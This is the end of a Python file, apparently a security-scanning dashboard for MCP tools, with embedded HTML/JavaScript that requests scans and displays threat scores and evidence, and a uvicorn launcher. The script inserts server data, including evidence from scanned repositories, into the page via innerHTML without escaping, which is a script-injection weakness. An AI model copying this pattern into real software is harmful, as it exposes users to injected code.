                                <th>Scan Type</th>
                                <th>Risk Level</th>
                                <th>Threats</th>
                                <th>Score</th>
                                <th>Actions</th>
                            </tr>
                        </thead>
                        <tbody id="historyTableBody">
                            <tr><td colspan="7" style="text-align: center; color: #6b7280;">No scans performed yet</td></tr>
                        </tbody>
                    </table>
                </div>
            </div>
        </div>
    </div>
    
    <!-- Modal for detailed scan results -->
    <div id="detailModal" class="modal">
        <div class="modal-content">
            <div class="modal-header">
                <h2 id="modalTitle">Scan Report Details</h2>
                <button class="modal-close" onclick="closeModal()">&times;</button>
            </div>
            <div id="modalBody">
                <!-- Populated dynamically -->
            </div>
        </div>
    </div>
    <script>
        // Define ALL functions directly in global scope for onclick handlers
        var selectedScanMode = null;
        var scanModes = {};

        function initDashboard() {
            loadScanModes();
            loadStats();
        }

        async function loadScanModes() {
            try {
                const response = await fetch('/api/scan-modes');
                scanModes = await response.json();
                renderScanModes();
            } catch (error) {
                console.error('Failed to load scan modes:', error);
            }
        }

        function renderScanModes() {
            const grid = document.getElementById('scanModesGrid');
            grid.innerHTML = '';
            Object.entries(scanModes).forEach(([key, mode]) => {
                const card = document.createElement('div');
                card.className = 'scan-mode-card';
                card.onclick = () => selectScanMode(key, card);
                const riskClass = mode.risk_level.includes('Preview') ? 'preview' : '';
                card.innerHTML = `
                    <div class="scan-mode-header">
                        <span class="scan-mode-icon">${mode.icon}</span>
                        <div class="scan-mode-title">
                            <div class="scan-mode-name">${mode.name}</div>
                        </div>
                        <div class="scan-mode-risk ${riskClass}">${mode.risk_level.split(' - ')[0]}</div>
                    </div>
                    <div class="scan-mode-description">${mode.description}</div>
                    <div style="margin-top: 10px; font-size: 0.9rem; color: #6b7280;">
                        <strong>When to use:</strong> ${mode.when_to_use}
                    </div>
                `;
                grid.appendChild(card);
            });
        }

        function selectScanMode(mode, card) {
            selectedScanMode = mode;
            document.querySelectorAll('.scan-mode-card').forEach(c => c.classList.remove('selected'));
            card.classList.add('selected');
        }

        async function startScan() {
            const target = document.getElementById('scanTarget').value;
            if (!target) { alert('Please enter a target to scan'); return; }
            if (!selectedScanMode) { alert('Please select a scan mode'); return; }

            document.getElementById('scanProgress').style.display = 'block';
            updateProgress(0);

            try {
                let endpoint = '';
                const requestBody = {};

                switch(selectedScanMode) {
                    case 'local_scan':
                        endpoint = '/api/scan/local';
                        requestBody.target_path = target;
                        break;
                    case 'github_scan':
                        endpoint = '/api/scan/github';
                        requestBody.repo_url = target;
                        break;
                    case 'config_discovery':
                        endpoint = '/api/scan/config-discovery';
                        break;
                    case 'quick_scan':
                        // Use same endpoint but with quick mode flag
                        if (target.includes('github.com')) {
                            endpoint = '/api/scan/github';
                            requestBody.repo_url = target;
                            requestBody.quick_mode = true;
                        } else {
                            endpoint = '/api/scan/local';
                            requestBody.target_path = target;
                            requestBody.quick_mode = true;
                        }
                        break;
                    default:
                        alert('Please select a scan mode');
                        return;
                }

                requestBody.enable_llm = document.getElementById('enableLLM').checked;
                requestBody.deep_scan = document.getElementById('deepScan').checked;

                updateProgress(30);
                const response = await fetch(endpoint, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify(requestBody)
                });
                updateProgress(70);
                const result = await response.json();
                updateProgress(100);
                displayScanResults(result);
                await loadStats();
            } catch (error) {
                alert('Scan failed: ' + error.message);
            } finally {
                setTimeout(() => {
                    document.getElementById('scanProgress').style.display = 'none';
                }, 1000);
            }
        }

        function updateProgress(percent) {
            const fill = document.getElementById('progressFill');
            fill.style.width = percent + '%';
            fill.textContent = percent + '%';
        }

        function displayScanResults(results) {
            const container = document.getElementById('scanResults');
            container.classList.add('show');
            
            // Calculate threat score and level
            const threatScore = results.threat_score || 0;
            const threatLevel = getThreatlevel(threatScore);
            const scoreClass = `score-${threatLevel.toLowerCase()}`;
            
            let html = '<h3>Scan Results Summary</h3>';
            
            // Add clear threat score badge
            html += `
                <div class="threat-score-badge ${scoreClass}">
                    Risk Score: ${threatScore}/100 - ${threatLevel}
                </div>
                <p style="color: #6b7280; margin: 10px 0;">
                    ${getScoreExplanation(threatScore)}
                </p>
            `;
            
            if (results.threats && results.threats.length > 0) {
                html += `
                    <div class="threat-detail-section">
                        <h4>🚨 Security Issues Detected</h4>
                        <div class="threat-metric">
                            <span class="metric-label">Total Threats Found:</span>
                            <span class="metric-value">${results.threats.length}</span>
                        </div>
                        <div class="threat-metric">
                            <span class="metric-label">Critical Severity:</span>
                            <span class="metric-value">${results.threats.filter(t => t.severity === 'CRITICAL').length}</span>
                        </div>
                        <div class="threat-metric">
                            <span class="metric-label">High Severity:</span>
                            <span class="metric-value">${results.threats.filter(t => t.severity === 'HIGH').length}</span>
                        </div>
                        <div class="threat-metric">
                            <span class="metric-label">Files Analyzed:</span>
                            <span class="metric-value">${results.files_analyzed || 1}</span>
                        </div>
                    </div>
                `;
                
                html += '<h4>Threat Details:</h4>';
                results.threats.forEach(threat => {
                    const severityClass = `severity-${(threat.severity || 'medium').toLowerCase()}`;
                    html += `
                        <div class="threat-card">
                            <div class="threat-header">
                                <strong>${threat.attack_vector || threat.type || 'Threat'}</strong>
                                <span class="threat-severity ${severityClass}">${threat.severity || 'MEDIUM'}</span>
                            </div>
                            <p><strong>What this means:</strong> ${threat.description || 'Security vulnerability detected'}</p>
                            ${threat.file_path ? `<p><strong>Location:</strong> <code>${threat.file_path}</code></p>` : ''}
                            ${threat.confidence ? `<p><strong>Confidence:</strong> ${Math.round(threat.confidence * 100)}%</p>` : ''}
                        </div>`;
                });
                
                // Store the full results for history
                if (results.run_id) {
                    sessionStorage.setItem(`scan_${results.run_id}`, JSON.stringify(results));
                }
            } else {
                html += `
                    <div style="background: #d1fae5; padding: 20px; border-radius: 8px; margin: 20px 0;">
                        <h3 style="color: #059669;">✅ No Security Threats Detected</h3>
                        <p style="color: #047857;">This scan found no security vulnerabilities. The target appears to be safe.</p>
                    </div>
                `;
            }
            
            container.innerHTML = html;
            
            // Update stats after scan
            loadStats();
        }
        
        function getThreatlevel(score) {
            if (score >= 80) return 'CRITICAL';
            if (score >= 60) return 'HIGH';
            if (score >= 40) return 'MEDIUM';
            if (score >= 20) return 'LOW';
            return 'SAFE';
        }
        
        function getScoreExplanation(score) {
            if (score >= 80) return '⛔ CRITICAL RISK: Do not use this tool. Multiple severe vulnerabilities detected that could compromise your system.';
            if (score >= 60) return '🚨 HIGH RISK: Significant security issues found. Use only in isolated environments with extreme caution.';
            if (score >= 40) return '⚠️ MEDIUM RISK: Some concerning patterns detected. Review threats carefully before proceeding.';
            if (score >= 20) return '📊 LOW RISK: Minor issues found. Generally safe but review the specific concerns.';
            return '✅ SAFE: No significant security issues detected. This tool appears safe to use.';
        }

        async function loadStats() {
            try {
                const response = await fetch('/api/stats');
                const stats = await response.json();
                
                // Update header stats with clear meanings
                document.getElementById('totalScans').textContent = stats.recent_scans?.length || 0;
                document.getElementById('threatsFound').textContent = stats.statistics?.total_threats || 0;
                
                // Calculate average threat score
                let avgScore = 0;
                if (stats.recent_scans && stats.recent_scans.length > 0) {
                    const totalScore = stats.recent_scans.reduce((sum, scan) => sum + (scan.threat_score || 0), 0);
                    avgScore = Math.round(totalScore / stats.recent_scans.length);
                }
                document.getElementById('threatScore').textContent = avgScore;
                
                document.getElementById('llmStatus').textContent = stats.llm_available ? '🟢' : '🔴';
                
                // Update history table with detailed information
                if (stats.recent_scans && stats.recent_scans.length > 0) {
                    const tbody = document.getElementById('historyTableBody');
                    tbody.innerHTML = '';
                    
                    stats.recent_scans.forEach(scan => {
                        const row = document.createElement('tr');
                        const threatLevel = getThreatlevel(scan.threat_score || 0);
                        const levelClass = `severity-${threatLevel.toLowerCase()}`;
                        
                        row.innerHTML = `
                            <td>${new Date(scan.timestamp).toLocaleString()}</td>
                            <td>${scan.repo_name || scan.repo_url || 'Unknown'}</td>
                            <td>${scan.scan_type || 'static'}</td>
                            <td><span class="threat-severity ${levelClass}">${threatLevel}</span></td>
                            <td>${scan.total_threats || 0}</td>
                            <td>${scan.threat_score || 0}/100</td>
                            <td>
                                <button class="btn btn-secondary" style="padding: 5px 15px; font-size: 0.9rem;" 
                                        onclick="viewScanDetails('${scan.run_id}')">
                                    View Details
                                </button>
                            </td>
                        `;
                        tbody.appendChild(row);
                    });
                }
            } catch (error) {
                console.error('Failed to load stats:', error);
            }
        }
        
        async function viewScanDetails(runId) {
            try {
                // Try to get from session storage first
                let scanData = sessionStorage.getItem(`scan_${runId}`);
                if (scanData) {
                    scanData = JSON.parse(scanData);
                    showDetailModal(scanData);
                } else {
                    // Fetch from API
                    const response = await fetch(`/api/run/${runId}`);
                    const data = await response.json();
                    showDetailModal(data);
                }
            } catch (error) {
                alert('Failed to load scan details: ' + error.message);
            }
        }
        
        function showDetailModal(data) {
            const modal = document.getElementById('detailModal');
            const modalBody = document.getElementById('modalBody');
            const threatLevel = getThreatlevel(data.threat_score || 0);
            const scoreClass = `score-${threatLevel.toLowerCase()}`;
            
            let html = `
                <div class="threat-score-badge ${scoreClass}">
                    Overall Risk Score: ${data.threat_score || 0}/100 - ${threatLevel}
                </div>
                
                <div class="threat-detail-section">
                    <h4>Scan Information</h4>
                    <div class="threat-metric">
                        <span class="metric-label">Scan ID:</span>
                        <span class="metric-value">${data.run_id || 'N/A'}</span>
                    </div>
                    <div class="threat-metric">
                        <span class="metric-label">Target:</span>
                        <span class="metric-value">${data.repo_url || data.target || 'Unknown'}</span>
                    </div>
                    <div class="threat-metric">
                        <span class="metric-label">Scan Type:</span>
                        <span class="metric-value">${data.scan_type || 'static'}</span>
                    </div>
                    <div class="threat-metric">
                        <span class="metric-label">Timestamp:</span>
                        <span class="metric-value">${new Date(data.scan_timestamp || Date.now()).toLocaleString()}</span>
                    </div>
                    <div class="threat-metric">
                        <span class="metric-label">LLM Analysis:</span>
                        <span class="metric-value">${data.llm_enabled ? 'Enabled' : 'Disabled'}</span>
                    </div>
                </div>
            `;
            
            if (data.threats && data.threats.length > 0) {
                html += `
                    <div class="threat-detail-section">
                        <h4>Threat Breakdown</h4>
                        <div class="threat-metric">
                            <span class="metric-label">Total Threats:</span>
                            <span class="metric-value">${data.threats.length}</span>
                        </div>
                `;
                
                // Group threats by severity
                const threatsBySeverity = {};
                data.threats.forEach(threat => {
                    const sev = threat.severity || 'MEDIUM';
                    if (!threatsBySeverity[sev]) threatsBySeverity[sev] = [];
                    threatsBySeverity[sev].push(threat);
                });
                
                Object.entries(threatsBySeverity).forEach(([severity, threats]) => {
                    html += `
                        <div class="threat-metric">
                            <span class="metric-label">${severity} Severity:</span>
                            <span class="metric-value">${threats.length}</span>
                        </div>
                    `;
                });
                
                html += '</div><h4>Detailed Threat Analysis</h4>';
                
                data.threats.forEach((threat, index) => {
                    const severityClass = `severity-${(threat.severity || 'medium').toLowerCase()}`;
                    html += `
                        <div class="threat-card">
                            <div class="threat-header">
                                <strong>#${index + 1}: ${threat.attack_vector || threat.type || 'Security Issue'}</strong>
                                <span class="threat-severity ${severityClass}">${threat.severity || 'MEDIUM'}</span>
                            </div>
                            <p><strong>Description:</strong> ${threat.description || 'No description available'}</p>
                            ${threat.file_path ? `<p><strong>File:</strong> <code>${threat.file_path}</code></p>` : ''}
                            ${threat.line_numbers && threat.line_numbers.length ? `<p><strong>Lines:</strong> ${threat.line_numbers.join(', ')}</p>` : ''}
                            ${threat.confidence ? `<p><strong>Confidence:</strong> ${Math.round(threat.confidence * 100)}%</p>` : ''}
                            ${threat.evidence && threat.evidence.length ? `
                                <details style="margin-top: 10px;">
                                    <summary style="cursor: pointer; color: var(--primary);">View Evidence</summary>
                                    <pre style="background: #f3f4f6; padding: 10px; border-radius: 4px; margin-top: 5px; overflow-x: auto;">${threat.evidence.join('\n')}</pre>
                                </details>
                            ` : ''}
                        </div>
                    `;
                });
            } else {
                html += `
                    <div style="background: #d1fae5; padding: 20px; border-radius: 8px; margin: 20px 0;">
                        <h3 style="color: #059669;">✅ Clean Scan</h3>
                        <p style="color: #047857;">No security threats were detected in this scan.</p>
                    </div>
                `;
            }
            
            // Add recommendations if available
            if (data.recommendations && data.recommendations.length > 0) {
                html += `
                    <div class="threat-detail-section">
                        <h4>📋 Recommendations</h4>
                        <ul class="capability-list">
                            ${data.recommendations.map(rec => `<li>${rec}</li>`).join('')}
                        </ul>
                    </div>
                `;
            }
            
            // Add export button
            html += `
                <div style="margin-top: 20px; text-align: right;">
                    <button class="btn btn-secondary" onclick="exportReport('${data.run_id}')">
                        📥 Export Report (JSON)
                    </button>
                </div>
            `;
            
            modalBody.innerHTML = html;
            modal.classList.add('show');
        }
        
        function closeModal() {
            document.getElementById('detailModal').classList.remove('show');
        }
        
        function exportReport(runId) {
            // Get the scan data
            let scanData = sessionStorage.getItem(`scan_${runId}`);
            if (!scanData) {
                fetch(`/api/run/${runId}`)
                    .then(res => res.json())
                    .then(data => {
                        downloadJSON(data, `security-report-${runId}.json`);
                    });
            } else {
                downloadJSON(JSON.parse(scanData), `security-report-${runId}.json`);
            }
        }
        
        function downloadJSON(data, filename) {
            const blob = new Blob([JSON.stringify(data, null, 2)], {type: 'application/json'});
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = filename;
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
            URL.revokeObjectURL(url);
        }

        function switchTab(tabName, evt) {
            document.querySelectorAll('.nav-tab').forEach(tab => tab.classList.remove('active'));
            if (evt && evt.target) {
                evt.target.classList.add('active');
            } else {
                // Fallback - find the tab by name
                document.querySelector(`[onclick*="${tabName}"]`).classList.add('active');
            }
            document.querySelectorAll('.tab-content').forEach(content => content.classList.remove('active'));
            document.getElementById(tabName).classList.add('active');
        }

        function runQuickScan() {
            selectedScanMode = 'config_discovery';
            document.getElementById('scanTarget').value = 'auto';
            startScan();
        }

        document.addEventListener('DOMContentLoaded', initDashboard);
        setInterval(loadStats, 30000);
    </script>
</body>
</html>'''

if __name__ == "__main__":
    import argparse
    import socket

    import uvicorn

    # Parse command line arguments
    parser = argparse.ArgumentParser(description='MCP Security Dashboard')
    parser.add_argument('--port', type=int, default=8080, help='Port to run on (default: 8080)')
    parser.add_argument('--host', type=str, default='0.0.0.0', help='Host to bind to (default: 0.0.0.0)')
    args = parser.parse_args()

    # Function to find available port
    def find_available_port(start_port=8080, max_tries=10):
        for port in range(start_port, start_port + max_tries):
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            result = sock.connect_ex(('127.0.0.1', port))
            sock.close()
            if result != 0:  # Port is available
                return port
        return None

    # Check if specified port is available, if not find another
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    result = sock.connect_ex(('127.0.0.1', args.port))
    sock.close()

    if result == 0:  # Port is in use
        print(f"⚠️  Port {args.port} is already in use, finding available port...")
        available_port = find_available_port(args.port)
        if available_port:
            print(f"✅ Found available port: {available_port}")
            args.port = available_port
        else:
            print(f"❌ No available ports found between {args.port} and {args.port + 10}")
            print(f"Try specifying a different port: python3 {__file__} --port 9000")
            sys.exit(1)

    print(f"🚀 Starting MCP Security Dashboard on http://localhost:{args.port}")
    print("Press Ctrl+C to stop")

    uvicorn.run(app, host=args.host, port=args.port, log_level="info")
